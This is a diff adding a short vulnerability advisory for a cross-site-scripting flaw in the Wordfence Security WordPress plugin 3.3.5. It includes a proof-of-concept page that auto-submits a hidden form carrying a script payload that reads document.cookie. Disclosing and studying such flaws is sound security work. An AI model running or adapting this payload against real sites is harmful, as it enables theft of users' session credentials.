@@ -1,0 +1,20 @@
+source: http://www.securityfocus.com/bid/56159/info
+
+The Wordfence Security plugin for WordPress is prone to a cross-site-scripting vulnerability because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+Wordfence Security 3.3.5 is vulnerable; other versions may also be affected. 
+
+<html>
+<head>
+<title>Wordfence Security XSS exploit (C) 2012 MustLive. 
+http://websecurity.com.ua</title>
+</head>
+<body onLoad="document.hack.submit()">
+<form name="hack" action="http://site/?_wfsf=unlockEmail" method="post">
+<input type="hidden" name="email" 
+value="<script>alert(document.cookie)</script>">
+</form>
+</body>
+</html>
